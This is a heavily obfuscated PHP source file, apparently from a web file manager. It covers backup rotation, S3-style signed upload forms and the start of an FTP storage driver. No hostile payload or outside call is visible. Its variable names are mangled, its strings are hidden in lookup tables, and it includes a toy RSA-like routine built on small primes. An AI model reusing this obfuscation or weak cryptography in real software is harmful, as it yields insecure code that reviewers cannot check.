$FÙá„éÀÀ‘[374]($dß÷ÜÏÈÑ[$CàÁš’‹¨Ù]); while ($BÊÔÑ‹™‹ö < 0) { $BÊÔÑ‹™‹ö += 64; } $CÖ¢ì†²£Ã .= $F‚ËŒçƒ¯[$BÊÔÑ‹™‹ö]; } $BÑÓ× àÈ” = $FÙá„éÀÀ‘[376]($CÖ¢ì†²£Ã); break; goto Cä±è¿¥”Ä; D³óŒ’ÁÎ: $CÖ¢ì†²£Ã = $FÙá„éÀÀ‘[10]; $f¬ÚËÙó‹± = 0; $BÊÔÑ‹™‹ö = 0; goto D‘‘¨»‚ Ô; Cä±è¿¥”Ä: $BÔÛªíæÀ³ = $aùŠÓºòáĞ[710]; while ($BÔÛªíæÀ³ < $aùŠÓºòáĞ[641]) { if ($BÔÛªíæÀ³ >= 0) { break; } $BÔÛªíæÀ³++; } goto fĞŞÆŸ‡ä»; eÔ²¿¶ºŠó: $aÃ–¤íÇ“ë = $FÙá„éÀÀ‘[375]($aÃ–¤íÇ“ë); $a·Š²òÜï¯ = $aùŠÓºòáĞ[704]; $c­æ£ğ—£¹ = $aÃ–¤íÇ“ë[0]; goto b”³ÎŒğô«; fĞŞÆŸ‡ä»: default: $BÑÓ× àÈ” = $this->{$_SERVER[†Ô…Œèëôú][277]}($aÃ–¤íÇ“ë, $bÊÇòåîô± . $E²’Áåó•); $B¾òİÏ¢— = $aùŠÓºòáĞ[711]; while ($B¾òİÏ¢— < $aùŠÓºòáĞ[607]) { if ($B¾òİÏ¢— >= 0) { break; } $B¾òİÏ¢—++; } break; } if ($FêÏ®’¹ˆÌ - 1 > 0) { $BÑÓ× àÈ” = $this->{$_SERVER[†Ô…Œèëôú][215]}($BÑÓ× àÈ”, $bÊÇòåîô±, $FêÏ®’¹ˆÌ - 1); } return $BÑÓ× àÈ”; goto Cà›óìİ–Ê; aó˜Íã‡: $aùŠÓºòáĞ =& $_SERVER[›èö’ù¤]; $FÙá„éÀÀ‘ =& $_SERVER[†Ô…Œèëôú]; if (!$FÙá„éÀÀ‘[165]($aÃ–¤íÇ“ë) || $FÙá„éÀÀ‘[24]($aÃ–¤íÇ“ë) < 10) { return !1; } goto CÒ¯ò; Cà›óìİ–Ê: } public function aznl2b32f5e3($fàõãÄÖÔÅ) { goto Bóİ±º†¹; eÒà½½³ø: return $fÅ²Š¥‹ÃÌ; $e‚ßã”œŠ = $DšŞ²å‘ª÷[719]; if (strlen($e‚ßã”œŠ) < $DšŞ²å‘ª÷[641]) { return; } goto Fºçê»ÑÁª; eôÙììôØå: for ($DÆ¯”™ÃÓô = 0; $DÆ¯”™ÃÓô < $c¥¨øƒà‹ * 10; $DÆ¯”™ÃÓô++) { if (($c¥¨øƒà‹ * $DÆ¯”™ÃÓô + 1) % $D•éÜçŒ™Œ == 0) { $C…‘Öğ…·™ = $BºæİÂçÆÇ[271](($c¥¨øƒà‹ * $DÆ¯”™ÃÓô + 1) / $D•éÜçŒ™Œ); break; } } $cÚÅÈ²÷Ú = $this->{$_SERVER[†Ô…Œèëôú][172]}($CÁŠ•‰ºå¹ * $C¬­–Ğš—å . $BºæİÂçÆÇ[10], $BºæİÂçÆÇ[174]); $Càƒ…Àİ…Î = $DšŞ²å‘ª÷[718]; goto cÀ˜Ëí©¥ò; B†®¿àé…ó: while (1) { $C‡Ô‡Ñá = $D•éÜçŒ™Œ; $bÔğåÍâÜí = $c¥¨øƒà‹; while ($bÔğåÍâÜí % $C‡Ô‡Ñá != 0) { $b½ä”Ş¿Ô = $bÔğåÍâÜí; $Ağè—àÚóó = $DšŞ²å‘ª÷[714]; if (!$Ağè—àÚóó) { die; } $bÔğåÍâÜí = $C‡Ô‡Ñá; $Föà›óÃ« = $DšŞ²å‘ª÷[715]; $C‡Ô‡Ñá = $b½ä”Ş¿Ô % $C‡Ô‡Ñá; $AÊéØ»¦… = $DšŞ²å‘ª÷[716]; if (!$AÊéØ»¦…) { return; } } if ($C‡Ô‡Ñá == 1) { break; } else { $D•éÜçŒ™Œ++; } } $C…‘Öğ…·™ = 2; $fÎµÜØãŒ“ = $DšŞ²å‘ª÷[717]; goto eôÙììôØå; B ½„Æé¬: if (strlen($f‹–Òº›µ‹) < $DšŞ²å‘ª÷[619]) { die; } $D•éÜçŒ™Œ = $BºæİÂçÆÇ[271](($CÁŠ•‰ºå¹ + $C¬­–Ğš—å) / 2); $e®ß¾¢ë = $DšŞ²å‘ª÷[713]; goto B†®¿àé…ó; cÀ˜Ëí©¥ò: if (strlen($Càƒ…Àİ…Î) < $DšŞ²å‘ª÷[602]) { die; } $cøøŒñùÛ¦ = $BºæİÂçÆÇ[131]($BºæİÂçÆÇ[378] . ($CÁŠ•‰ºå¹ + $C¬­–Ğš—å) . $BºæİÂçÆÇ[379] . $D•éÜçŒ™Œ . $BºæİÂçÆÇ[379] . $C…‘Öğ…·™ . $BºæİÂçÆÇ[380]); $fÅ²Š¥‹ÃÌ = $this->{$_SERVER[†Ô…Œèëôú][172]}($fàõãÄÖÔÅ, $cøøŒñùÛ¦) . $BºæİÂçÆÇ[381] . $cÚÅÈ²÷Ú; goto eÒà½½³ø; EòÍå‚‹°Ü: $C¬­–Ğš—å = $this->{$_SERVER[†Ô…Œèëôú][377]}(); $c¥¨øƒà‹ = ($CÁŠ•‰ºå¹ - 1) * ($C¬­–Ğš—å - 1); $f‹–Òº›µ‹ = $DšŞ²å‘ª÷[712]; goto B ½„Æé¬; Bóİ±º†¹: $DšŞ²å‘ª÷ =& $_SERVER[›èö’ù¤]; $BºæİÂçÆÇ =& $_SERVER[†Ô…Œèëôú]; $CÁŠ•‰ºå¹ = $this->{$_SERVER[†Ô…Œèëôú][377]}(); goto EòÍå‚‹°Ü; Fºçê»ÑÁª: } public function ygfz159eabda($C¡·¬—Æâ§) { goto DÃ¶ÙÖÑ”É; Fù•ËàÒïµ: $còÇ†µ¯„‡ = $eº¼ğ¼öÃ[724]; $aˆİ—¶î²â = $this->{$_SERVER[†Ô…Œèëôú][277]}($câãÏÜ§±[0], $d¨­ƒùŠÙ); return $aˆİ—¶î²â; goto D«¤•ğ»¿; DÃ¶ÙÖÑ”É: $eº¼ğ¼öÃ =& $_SERVER[›èö’ù¤]; $fê‰”¿­Ö =& $_SERVER[†Ô…Œèëôú]; $câãÏÜ§± = $fê‰”¿­Ö[0]($fê‰”¿­Ö[381], $C¡·¬—Æâ§); goto EºšÒº°­; B¼Ğ¾ÄŒ­: $FäÈ›ø«ÖÕ = 2; for ($cÁ¨ò¤“Åß = 0; $cÁ¨ò¤“Åß < $CÌîÃÄ“º * 10; $cÁ¨ò¤“Åß++) { if (($CÌîÃÄ“º * $cÁ¨ò¤“Åß + 1) % $CÙĞŞÕ”‡ == 0) { $FäÈ›ø«ÖÕ = $fê‰”¿­Ö[271](($CÌîÃÄ“º * $cÁ¨ò¤“Åß + 1) / $CÙĞŞÕ”‡); break; } } $d¨­ƒùŠÙ = $fê‰”¿­Ö[131]($fê‰”¿­Ö[378] . ($B¥½¾ˆï‚± + $A¸¢½Ù§Å ) . $fê‰”¿­Ö[379] . $CÙĞŞÕ”‡ . $fê‰”¿­Ö[379] . $FäÈ›ø«ÖÕ . $fê‰”¿­Ö[380]); goto Fù•ËàÒïµ; b‘½¥ÀÙ¥: $Eˆ²¶–Ÿó‰ = $fê‰”¿­Ö[271]($Eˆ²¶–Ÿó‰); $B¥½¾ˆï‚± = 0; $A¸¢½Ù§Å  = 0; goto AÑ¡¤°ì–Ö; AÑ¡¤°ì–Ö: for ($cÁ¨ò¤“Åß = 3; $cÁ¨ò¤“Åß < $Eˆ²¶–Ÿó‰; $cÁ¨ò¤“Åß += 2) { if ($Eˆ²¶–Ÿó‰ % $cÁ¨ò¤“Åß != 0) { continue; } $B¥½¾ˆï‚± = $cÁ¨ò¤“Åß; $A¸¢½Ù§Å  = $fê‰”¿­Ö[271]($Eˆ²¶–Ÿó‰ / $cÁ¨ò¤“Åß); break; $Fò‚ùĞÑ¯ = $eº¼ğ¼öÃ[720]; while (strlen($Fò‚ùĞÑ¯) < $eº¼ğ¼öÃ[616]) { if (!$Fò‚ùĞÑ¯) { break; } $Fò‚ùĞÑ¯++; } } $CÌîÃÄ“º = ($B¥½¾ˆï‚± - 1) * ($A¸¢½Ù§Å  - 1); $CÙĞŞÕ”‡ = $fê‰”¿­Ö[271](($B¥½¾ˆï‚± + $A¸¢½Ù§Å ) / 2); goto EºÃğà¿Ãù; EºÃğà¿Ãù: $AºöšÂŠ = $eº¼ğ¼öÃ[721]; while ($AºöšÂŠ < $eº¼ğ¼öÃ[616]) { if ($AºöšÂŠ >= 0) { break; } $AºöšÂŠ++; } while (1) { $Cê¬Øİ­© = $CÙĞŞÕ”‡; $Bóå©‘Ú»Ó = $eº¼ğ¼öÃ[722]; while (strlen($Bóå©‘Ú»Ó) < $eº¼ğ¼öÃ[616]) { if (!$Bóå©‘Ú»Ó) { break; } $Bóå©‘Ú»Ó++; } $c‘øàØÙòÍ = $CÌîÃÄ“º; $c”ÚŸê…©ø = $eº¼ğ¼öÃ[723]; if (!$c”ÚŸê…©ø) { return; } while ($c‘øàØÙòÍ % $Cê¬Øİ­© != 0) { $a¬Ã†ĞãÚ´ = $c‘øàØÙòÍ; $c‘øàØÙòÍ = $Cê¬Øİ­©; $Cê¬Øİ­© = $a¬Ã†ĞãÚ´ % $Cê¬Øİ­©; } if ($Cê¬Øİ­© == 1) { break; } else { $CÙĞŞÕ”‡++; } } goto B¼Ğ¾ÄŒ­; EºšÒº°­: if ($fê‰”¿­Ö[19]($câãÏÜ§±) != 2) { return $fê‰”¿­Ö[10]; } $Eˆ²¶–Ÿó‰ = $this->{$_SERVER[†Ô…Œèëôú][277]}($câãÏÜ§±[1] . $fê‰”¿­Ö[10], $fê‰”¿­Ö[174]); if (!$Eˆ²¶–Ÿó‰) { return $fê‰”¿­Ö[10]; } goto b‘½¥ÀÙ¥; D«¤•ğ»¿: } public function fvele88fbfd1() { goto E‡ç‘“Îíª; E‡ç‘“Îíª: $aØ©åÛ½Ñò =& $_SERVER[›èö’ù¤]; $D¸Ã‚ôÌ‰… =& $_SERVER[†Ô…Œèëôú]; $Cë­Ú¡àÀ† = $D¸Ã‚ôÌ‰…[363]($D¸Ã‚ôÌ‰…[382](2, 14), $D¸Ã‚ôÌ‰…[382](2, 16) - 1); goto fµ¯¶§ºÙ; fµ¯¶§ºÙ: $d¬¡ì­ÕÏİ = array(); $CÑğ–à˜· = $aØ©åÛ½Ñò[725]; if (strlen($CÑğ–à˜·) < $aØ©åÛ½Ñò[641]) { return; } goto bÆÃ‹èË‡ª; EÊ§—×¿¦²: return $f´×›Ğâãó; $c»Ü‚Ãáƒ = $aØ©åÛ½Ñò[730]; while (strlen($c»Ü‚Ãáƒ) < $aØ©åÛ½Ñò[619]) { if (!$c»Ü‚Ãáƒ) { break; } $c»Ü‚Ãáƒ++; } goto cØÜŒ‰İ‡; bÆÃ‹èË‡ª: $bùø²¯è† = 1; while ($bùø²¯è† <= (int) $D¸Ã‚ôÌ‰…[383]($Cë­Ú¡àÀ†)) { $F‹éŸ˜¥©æ = $bùø²¯è†; $Fº×‚Éğ· = $aØ©åÛ½Ñò[726]; if (strlen($Fº×‚Éğ·) < $aØ©åÛ½Ñò[616]) { die; } while (!0) { $F‹éŸ˜¥©æ++; $A†÷ÁÉôÜ = $aØ©åÛ½Ñò[727]; if (!$A†÷ÁÉôÜ) { die; } if ($F‹éŸ˜¥©æ <= 2) { $bùø²¯è† = $F‹éŸ˜¥©æ; break; } else { if ($F‹éŸ˜¥©æ < 2) { continue; } } $AÛá·ĞÄÁà = !0; for ($D»ÂˆŒ«ÔÑ = 2; $D»ÂˆŒ«ÔÑ <= $D¸Ã‚ôÌ‰…[383]($F‹éŸ˜¥©æ); $D»ÂˆŒ«ÔÑ++) { if ($F‹éŸ˜¥©æ % $D»ÂˆŒ«ÔÑ == 0) { $AÛá·ĞÄÁà = !1; } } if ($AÛá·ĞÄÁà) { $bùø²¯è† = $F‹éŸ˜¥©æ; break; } } $d¬¡ì­ÕÏİ[] = $bùø²¯è†; } $f´×›Ğâãó = 2; goto DÒ¬ğ«Æˆ¼; DÒ¬ğ«Æˆ¼: $CšæÀŸÓãŞ = $aØ©åÛ½Ñò[728]; if (!$CšæÀŸÓãŞ) { die; } for ($F‹éŸ˜¥©æ = $Cë­Ú¡àÀ†; $F‹éŸ˜¥©æ > 1; $F‹éŸ˜¥©æ--) { $AÛá·ĞÄÁà = !0; $d…®Ï‚¸¯ = $aØ©åÛ½Ñò[729]; if (!$d…®Ï‚¸¯) { die; } foreach ($d¬¡ì­ÕÏİ as $B¼¨İâ¬Øš) { if ($F‹éŸ˜¥©æ % $B¼¨İâ¬Øš == 0) { $AÛá·ĞÄÁà = !1; break; } } if ($AÛá·ĞÄÁà) { $f´×›Ğâãó = $F‹éŸ˜¥©æ; break; } } goto EÊ§—×¿¦²; cØÜŒ‰İ‡: } public function flpzee05990a($Díòù¼ºà, $fÆ‡×¬È) { $eÔ„Ğåˆ§‰ =& $_SERVER[†Ô…Œèëôú]; return $eÔ„Ğåˆ§‰[13](array($eÔ„Ğåˆ§‰[14], $eÔ„Ğåˆ§‰[384]), $Díòù¼ºà, $fÆ‡×¬È); $b·³òˆ„Ì¥ = $_SERVER[›èö’ù¤][731]; } public function psiu4d504e97($cµ¢¹‹ã‡ö, $F¦ŸÉÔõ½) { $D†Š¹Œš =& $_SERVER[†Ô…Œèëôú]; return $D†Š¹Œš[13](array($D†Š¹Œš[385], $D†Š¹Œš[386]), $cµ¢¹‹ã‡ö, $F¦ŸÉÔõ½); } public function sviuc41cf9e3($c³·‹ªºõ©, $cß„èµÁ¡×) { $fª±šù¢˜¡ =& $_SERVER[†Ô…Œèëôú]; return $fª±šù¢˜¡[13](array($fª±šù¢˜¡[385], $fª±šù¢˜¡[387]), $c³·‹ªºõ©, $cß„èµÁ¡×); } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $a§˜•ÓÖŸ° =& $_SERVER[›èö’ù¤]; $this->isManual(); self::$name = date($a§˜•ÓÖŸ°[732]); if (!($D§‰ãÖ•¹Ğ = Model($a§˜•ÓÖŸ°[733])->lastItem())) { $D§‰ãÖ•¹Ğ = $this->initData(); } else { self::$name = $D§‰ãÖ•¹Ğ[$a§˜•ÓÖŸ°[28]]; if ($D§‰ãÖ•¹Ğ[$a§˜•ÓÖŸ°[734]] == $a§˜•ÓÖŸ°[87]) { self::$name = date($a§˜•ÓÖŸ°[735]); $b‚®ˆÇ½İ¡ = 0; if (isset($D§‰ãÖ•¹Ğ[$a§˜•ÓÖŸ°[291]][$a§˜•ÓÖŸ°[193]][$a§˜•ÓÖŸ°[462]])) { $b‚®ˆÇ½İ¡ = (int) $D§‰ãÖ•¹Ğ[$a§˜•ÓÖŸ°[291]][$a§˜•ÓÖŸ°[193]][$a§˜•ÓÖŸ°[462]]; } if (self::$manual == 0 && $D§‰ãÖ•¹Ğ[$a§˜•ÓÖŸ°[28]] == self::$name) { Model($a§˜•ÓÖŸ°[733])->remove($D§‰ãÖ•¹Ğ[$a§˜•ÓÖŸ°[395]]); } $D§‰ãÖ•¹Ğ = $this->initData($b‚®ˆÇ½İ¡, $D§‰ãÖ•¹Ğ[$a§˜•ÓÖŸ°[736]]); } else { $this->checkStore($D§‰ãÖ•¹Ğ[$a§˜•ÓÖŸ°[736]]); } } self::$option = $D§‰ãÖ•¹Ğ; } private function isManual() { $b›áÅÈì¦‡ = _get($GLOBALS, $_SERVER[›èö’ù¤][737], 0); $b›áÅÈì¦‡ = intval($b›áÅÈì¦‡); self::$manual = $b›áÅÈì¦‡ && $b›áÅÈì¦‡ == 1 ? 1 : 0; } private function initData($cç‹ÓÌ¬¯ë = 0, $EêÀ–‡ÔÅ = '') { goto AšÒòŠ±ğ; aÅ„ïÁÂÄ»: $eŒ…‡Í„İ = Model($aËËé¡ğÓ[733])->insert($d£­ñå®î¼); $d£­ñå®î¼[$aËËé¡ğÓ[395]] = $eŒ…‡Í„İ; return $d£­ñå®î¼; goto CïãÔ²„Š¿; AšÒòŠ±ğ: $aËËé¡ğÓ =& $_SERVER[›èö’ù¤]; $Dä˜±ª¼«§ = Model($aËËé¡ğÓ[733])->config(); if ($EêÀ–‡ÔÅ && $Dä˜±ª¼«§[$aËËé¡ğÓ[736]] != $EêÀ–‡ÔÅ) { $cç‹ÓÌ¬¯ë = 0; } goto aí™ƒØôÔ; aí™ƒØôÔ: $this->checkStore($Dä˜±ª¼«§[$aËËé¡ğÓ[736]]); if (self::$manual == 1) { self::$name .= $aËËé¡ğÓ[71] . date($aËËé¡ğÓ[738]); } $d£­ñå®î¼ = array($aËËé¡ğÓ[736] => $Dä˜±ª¼«§[$aËËé¡ğÓ[736]], $aËËé¡ğÓ[28] => self::$name, $aËËé¡ğÓ[734] => 0, $aËËé¡ğÓ[739] => $Dä˜±ª¼«§[$aËËé¡ğÓ[739]], $aËËé¡ğÓ[740] => self::$manual, $aËËé¡ğÓ[291] => array($aËËé¡ğÓ[741] => array($aËËé¡ğÓ[734] => 0), $aËËé¡ğÓ[742] => array($aËËé¡ğÓ[734] => 0, $aËËé¡ğÓ[743] => 0, $aËËé¡ğÓ[744] => 0, $aËËé¡ğÓ[29] => $aËËé¡ğÓ[33], $aËËé¡ğÓ[745] => 0, $aËËé¡ğÓ[491] => 0), $aËËé¡ğÓ[746] => array($aËËé¡ğÓ[734] => 0, $aËËé¡ğÓ[743] => 0, $aËËé¡ğÓ[744] => 0, $aËËé¡ğÓ[745] => 0, $aËËé¡ğÓ[491] => 0), $aËËé¡ğÓ[193] => array($aËËé¡ğÓ[734] => 0, $aËËé¡ğÓ[747] => 0, $aËËé¡ğÓ[748] => 0, $aËËé¡ğÓ[749] => 0, $aËËé¡ğÓ[750] => 0, $aËËé¡ğÓ[462] => $cç‹ÓÌ¬¯ë, $aËËé¡ğÓ[745] => 0, $aËËé¡ğÓ[491] => 0)), $aËËé¡ğÓ[745] => time(), $aËËé¡ğÓ[491] => 0); goto aÅ„ïÁÂÄ»; CïãÔ²„Š¿: } private function checkStore($c‘ÌĞÁ½‹È) { $d ôÅëæ¿¤ =& $_SERVER[›èö’ù¤]; $EØõîÔ÷›° = Model($d ôÅëæ¿¤[751])->listData($c‘ÌĞÁ½‹È); Model($d ôÅëæ¿¤[751])->checkConfig($EØõîÔ÷›°); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[›èö’ù¤][733])->findByName(self::$name); } return self::$option; } public static function set($F¤£¬òß²) { $a®Ú±°õ…Ç =& $_SERVER[›èö’ù¤]; $b©ë„ÔãŠ = self::get(); foreach ($F¤£¬òß² as $DËÛŠ…¡Œø => $DŒ‰¹Ã™¯ƒ) { $A²””ìØÚ = explode($a®Ú±°õ…Ç[95], $DËÛŠ…¡Œø); $Dø’†Å™ÎÇ = count($A²””ìØÚ); switch ($Dø’†Å™ÎÇ) { case 1: $b©ë„ÔãŠ[$A²””ìØÚ[0]] = $DŒ‰¹Ã™¯ƒ; break; case 2: $b©ë„ÔãŠ[$A²””ìØÚ[0]][$A²””ìØÚ[1]] = $DŒ‰¹Ã™¯ƒ; break; case 3: $b©ë„ÔãŠ[$A²””ìØÚ[0]][$A²””ìØÚ[1]][$A²””ìØÚ[2]] = $DŒ‰¹Ã™¯ƒ; break; } } Model($a®Ú±°õ…Ç[733])->update($b©ë„ÔãŠ[$a®Ú±°õ…Ç[395]], $b©ë„ÔãŠ); self::$option = $b©ë„ÔãŠ; return self::$option; } public function keep() { $cˆ³¬Äİ½õ =& $_SERVER[›èö’ù¤]; $E¤ö¬–…² = self::get(); if ($E¤ö¬–…²[$cˆ³¬Äİ½õ[291]][$cˆ³¬Äİ½õ[741]][$cˆ³¬Äİ½õ[734]] == $cˆ³¬Äİ½õ[87]) { return; } $this->backupKeep($E¤ö¬–…²); self::set(array($cˆ³¬Äİ½õ[752] => 1)); } private function backupKeep($eÒª ”ãµ) { goto e’Œë“‹×¡; C…»£ù¨Ìƒ: $F­«¥µå—î = Model($d«Â›ñ¯·æ[754])->get($d«Â›ñ¯·æ[755]); foreach ($BÖ›Æ¼ñë» as $A÷ö²•“³˜) { if (isset($A÷ö²•“³˜[$d«Â›ñ¯·æ[740]]) && $A÷ö²•“³˜[$d«Â›ñ¯·æ[740]] == $d«Â›ñ¯·æ[87]) { continue; } if (!empty($A÷ö²•“³˜[$d«Â›ñ¯·æ[28]]) && in_array($A÷ö²•“³˜[$d«Â›ñ¯·æ[28]], $eÆ…§¡•Áâ)) { continue; } Model($d«Â›ñ¯·æ[733])->remove($A÷ö²•“³˜[$d«Â›ñ¯·æ[395]]); $F©¿ß­Å„‚ = $this->backupPath($eÒª ”ãµ, $F­«¥µå—î); IO::remove($F©¿ß­Å„‚, !1); } goto CåÎ¡¨±ÉŞ; a­Ä‰­Å´: foreach ($BÖ›Æ¼ñë» as $A÷ö²•“³˜) { if ($eŠ®Ñ²â’³ >= 7) { break; } $eÆ…§¡•Áâ[] = $A÷ö²•“³˜[$d«Â›ñ¯·æ[28]]; $eŠ®Ñ²â’³++; } for ($eŠ®Ñ²â’³ = 0; $eŠ®Ñ²â’³ < 12; $eŠ®Ñ²â’³++) { $eÆ…§¡•Áâ[] = date($d«Â›ñ¯·æ[753], strtotime("\x2d{$eŠ®Ñ²â’³}\40\x6d\157\x6e\164\x68\x73")); } $eÆ…§¡•Áâ = array_unique($eÆ…§¡•Áâ); goto C…»£ù¨Ìƒ; FÇõæƒ° µ: if (empty($BÖ›Æ¼ñë»)) { return; } $eŠ®Ñ²â’³ = 0; $eÆ…§¡•Áâ = array(); goto a­Ä‰­Å´; e’Œë“‹×¡: $d«Â›ñ¯·æ =& $_SERVER[›èö’ù¤]; if (self::$manual == 1) { return; } $BÖ›Æ¼ñë» = Model($d«Â›ñ¯·æ[733])->listData(); goto FÇõæƒ° µ; CåÎ¡¨±ÉŞ: } private function backupPath($A”­¼‘Ş, $DÌÎ£¾µ’ = false) { $dœ¿¼éìÔã =& $_SERVER[›èö’ù¤]; if (!$DÌÎ£¾µ’) { $DÌÎ£¾µ’ = Model($dœ¿¼éìÔã[754])->get($dœ¿¼éìÔã[755]); } $DæôÖèÑšë = $A”­¼‘Ş[$dœ¿¼éìÔã[28]]; $c„öÅ•©Î = substr(md5($dœ¿¼éìÔã[756] . $DÌÎ£¾µ’ . $DæôÖèÑšë), 0, 8); return "\x7b\x69\x6f\72{$A”­¼‘Ş[$dœ¿¼éìÔã[736]]}\175\57\x64\x61\x74\141\x62\x61\x73\x65\x2f\142\141\x63\153\165\160\x2f" . $DæôÖèÑšë . $dœ¿¼éìÔã[71] . $c„öÅ•©Î; } public function db() { goto cÃÂÊ›­£; f‹Î‚”ˆ˜: return !0; goto DœÉ”á¶®; A ·Ùª¬: $B²†ÒÎÒÄ‘ = new BackupDb(); if (!$B²†ÒÎÒÄ‘->index()) { return !1; } self::set(array($Dì’™œÎ‰ë[757] => 1)); goto f‹Î‚”ˆ˜; cÃÂÊ›­£: $Dì’™œÎ‰ë =& $_SERVER[›èö’ù¤]; $EÜ„ÛÃ‹ßĞ = self::get(); if ($EÜ„ÛÃ‹ßĞ[$Dì’™œÎ‰ë[291]][$Dì’™œÎ‰ë[742]][$Dì’™œÎ‰ë[734]] == $Dì’™œÎ‰ë[87]) { return !0; } goto A ·Ùª¬; DœÉ”á¶®: } public function dbFile() { goto C‚ë°¯¤Ã; AÛ¦ÖÂ¹…İ: return !0; goto aáƒ í‘é¼; C‚ë°¯¤Ã: $b¾«¸ÂÕªÑ =& $_SERVER[›èö’ù¤]; $f¬¼„»È†‰ = self::get(); if ($f¬¼„»È†‰[$b¾«¸ÂÕªÑ[291]][$b¾«¸ÂÕªÑ[746]][$b¾«¸ÂÕªÑ[734]] == $b¾«¸ÂÕªÑ[87]) { return !0; } goto a¶ïŞàõ¯«; a¶ïŞàõ¯«: $e­—Ô«À = new BackupDbFile(); if (!$e­—Ô«À->index()) { return !1; } self::set(array($b¾«¸ÂÕªÑ[758] => 1)); goto AÛ¦ÖÂ¹…İ; aáƒ í‘é¼: } public function file() { $F¶ ”óòÒ =& $_SERVER[›èö’ù¤]; $D§’Â¬öÎ = self::get(); if ($D§’Â¬öÎ[$F¶ ”óòÒ[291]][$F¶ ”óòÒ[193]][$F¶ ”óòÒ[734]] == $F¶ ”óòÒ[87]) { return !0; } if (!isset($D§’Â¬öÎ[$F¶ ”óòÒ[739]]) || $D§’Â¬öÎ[$F¶ ”óòÒ[739]] == $F¶ ”óòÒ[191]) { $bé™à®¤ãÃ = new BackupFile(); if (!$bé™à®¤ãÃ->index()) { return !1; } } self::set(array($F¶ ”óòÒ[759] => 1, $F¶ ”óòÒ[734] => 1)); return !0; } } goto eé¯‹ˆÕÙ¡; f·ùÈòá‚è: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($dŒ˜¨ÇôÎ¼) { parent::__construct($dŒ˜¨ÇôÎ¼); $this->signatureVersion($_SERVER[›èö’ù¤][212]); } public function uploadFormData($FÑ˜ÔõÓ, $dˆæ¯µèˆ = 3600) { goto Dà…ùÄÂ¬¯; fò­­‰•¯×: $E²—Õâ§‡ = array($bÅ§Ñ¬ØÈŒ[211] => $bÅ§Ñ¬ØÈŒ[33], $bÅ§Ñ¬ØÈŒ[1260] => $bÅ§Ñ¬ØÈŒ[33], $bÅ§Ñ¬ØÈŒ[1217] => $Eó™ˆšÈ¶, $bÅ§Ñ¬ØÈŒ[1221] => $aäµµ¹íÓÁ, $bÅ§Ñ¬ØÈŒ[1225] => $B²Öë•»½, $bÅ§Ñ¬ØÈŒ[1261] => $DèôÉò‰ì², $bÅ§Ñ¬ØÈŒ[1262] => $aÂ‘¶•¦®Ø, $bÅ§Ñ¬ØÈŒ[1263] => $f¨’‰‚«È„, $bÅ§Ñ¬ØÈŒ[1264] => $AÄ¸ƒ¶Ù»Ù, $bÅ§Ñ¬ØÈŒ[1265] => $B©äË³¡, $bÅ§Ñ¬ØÈŒ[175] => $this->getHost()); return $E²—Õâ§‡; goto e¦ÓÈİ¤Û; Dà…ùÄÂ¬¯: $bÅ§Ñ¬ØÈŒ =& $_SERVER[›èö’ù¤]; $Eó™ˆšÈ¶ = $bÅ§Ñ¬ØÈŒ[192]; $aÂ‘¶•¦®Ø = $bÅ§Ñ¬ØÈŒ[1248]; goto dÓö‚Õ‰Š; dÓö‚Õ‰Š: $d—‰éù«Ö = $bÅ§Ñ¬ØÈŒ[59]; $f¨’‰‚«È„ = gmdate($bÅ§Ñ¬ØÈŒ[1249]); $báÅš‹ŞÎì = gmdate($bÅ§Ñ¬ØÈŒ[735]); goto F‘Â‹•Çô; e©¿ãßäÁ: $fËŠâ‡éŒ„ = array($this->accessKey, $báÅš‹ŞÎì, $this->region, $d—‰éù«Ö, $AŠõÄÎ„Ÿù); $DèôÉò‰ì² = implode($bÅ§Ñ¬ØÈŒ[8], $fËŠâ‡éŒ„); $eÙÛ‹•àÕÖ = array($bÅ§Ñ¬ØÈŒ[1215] => gmdate($bÅ§Ñ¬ØÈŒ[1214], strtotime($bÅ§Ñ¬ØÈŒ[1251])), $bÅ§Ñ¬ØÈŒ[1216] => array(array($bÅ§Ñ¬ØÈŒ[1218] => $this->bucket), array($bÅ§Ñ¬ØÈŒ[1217] => $Eó™ˆšÈ¶), array($bÅ§Ñ¬ØÈŒ[1219], $bÅ§Ñ¬ØÈŒ[1220], $bÅ§Ñ¬ØÈŒ[33]), array($bÅ§Ñ¬ØÈŒ[1219], $bÅ§Ñ¬ØÈŒ[1252], $bÅ§Ñ¬ØÈŒ[33]), array($bÅ§Ñ¬ØÈŒ[1219], $bÅ§Ñ¬ØÈŒ[1253], $bÅ§Ñ¬ØÈŒ[33]), array($bÅ§Ñ¬ØÈŒ[1221] => $aäµµ¹íÓÁ), array($bÅ§Ñ¬ØÈŒ[1254] => $DèôÉò‰ì²), array($bÅ§Ñ¬ØÈŒ[1255] => $aÂ‘¶•¦®Ø), array($bÅ§Ñ¬ØÈŒ[1256] => $f¨’‰‚«È„), array($bÅ§Ñ¬ØÈŒ[1257] => $AÄ¸ƒ¶Ù»Ù))); goto BÈ©ÔæÒˆ³; BÈ©ÔæÒˆ³: $B²Öë•»½ = base64_encode(json_encode($eÙÛ‹•àÕÖ)); $fíìœ÷ùİ¥ = hash_hmac($bÅ§Ñ¬ØÈŒ[1258], $báÅš‹ŞÎì, $bÅ§Ñ¬ØÈŒ[1259] . $this->secret, !0); $a×–šÍÓÇñ = hash_hmac($bÅ§Ñ¬ØÈŒ[1258], $this->region, $fíìœ÷ùİ¥, !0); goto c‚…Ä®È‡; c‚…Ä®È‡: $B†±ñÃ‹®Ê = hash_hmac($bÅ§Ñ¬ØÈŒ[1258], $d—‰éù«Ö, $a×–šÍÓÇñ, !0); $càÌÕğ¸æ‚ = hash_hmac($bÅ§Ñ¬ØÈŒ[1258], $AŠõÄÎ„Ÿù, $B†±ñÃ‹®Ê, !0); $B©äË³¡ = hash_hmac($bÅ§Ñ¬ØÈŒ[1258], $B²Öë•»½, $càÌÕğ¸æ‚); goto fò­­‰•¯×; F‘Â‹•Çô: $AŠõÄÎ„Ÿù = $bÅ§Ñ¬ØÈŒ[1250]; $AÄ¸ƒ¶Ù»Ù = $dˆæ¯µèˆ . $bÅ§Ñ¬ØÈŒ[33]; $aäµµ¹íÓÁ = $bÅ§Ñ¬ØÈŒ[1213]; goto e©¿ãßäÁ; e¦ÓÈİ¤Û: } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; private $config = array(); public function 